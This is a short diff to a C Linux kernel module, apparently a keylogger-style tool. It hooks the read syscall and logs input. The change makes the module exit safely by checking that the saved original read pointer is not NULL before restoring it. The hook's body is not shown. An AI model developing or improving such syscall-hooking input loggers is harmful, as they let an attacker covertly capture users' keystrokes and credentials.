@@ -15,7 +15,7 @@
 
 struct page *syscallPageTemp;
 
-asmlinkage int (*originalRead)(int, void*, size_t);
+asmlinkage int (*originalRead)(int, void*, size_t) = NULL;
 
 
 asmlinkage int readHook(int fd, void* buf, size_t nbytes) {
@@ -54,6 +54,8 @@ int __init logInput_init(void) {
 }
 
 void __exit logInput_exit(void) {
-	printk(KERN_INFO "restoring original read call to %p\n", originalRead);
-	hookSyscall(__NR_read, originalRead);
+	if (originalRead != NULL) {
+		printk(KERN_INFO "restoring original read call to %p\n", originalRead);
+		hookSyscall(__NR_read, originalRead);
+	}
 }
